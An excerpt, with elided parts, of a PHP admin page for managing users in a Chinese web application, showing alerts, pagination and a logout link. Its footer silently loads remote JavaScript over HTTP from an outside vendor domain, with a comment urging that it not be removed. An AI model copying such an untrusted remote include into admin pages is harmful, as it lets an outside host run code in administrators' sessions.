...
<?php
	...
	echo "<script>alert('请进行登陆');location='user.php';</script>";
	}
	//分页显示
...
<?php
	...
	echo "<script>alert('删除成功');location='user_index.php';</script>";
	}
?>
<?php
	//修改用户
	...
	echo "<script>alert('修改成功');location='user_index.php';</script>";
	}
?>
</head>
<body>
...
<table width="350" border="0" align="center" cellpadding="5" cellspacing="1" bgcolor="#B3B3B3">
  <tr>
    <td align="center" bgcolor="#FFFFFF"><a href='?tj=destroy'>注销本次登录</a>&nbsp;&nbsp;<?php echo "共有".$total."个会员，请对会员信息进行管理";?></td>
  </tr>
</table>
...
<?php } ?>
	...
	if( $page > 1 )
    {
    	echo "<a href='user_index.php?page=".($page-1)."'>前一页</a>&nbsp";
	}else{
   	echo "前一页&nbsp&nbsp";
	}
	for($i=1;$i<=$pagenum;$i++){
       $show=($i!=$page)?"<a href='user_index.php?page=".$i."'>".$i."</a>":"$i";
       Echo $show." ";
	}
	if( $page<$pagenum)
    {
    	echo "<a href='user_index.php?page=".($page+1)."'>后一页</a>";
	}else
	{
		echo "后一页";
     }
...
<table width="350" height="20" border="0" align="center" cellpadding="5" cellspacing="1" bgcolor="#CCCCCC">
  <tr>
    <td align="left" bgcolor="#FFFFFF">软件版本(在线帮助):<!--删除后将无法获得最新版本--><script type="text/javascript" src="http://www.04ie.com/net/phpregi0_2.js"></script></td>
  </tr>
</table>
</body>
</html>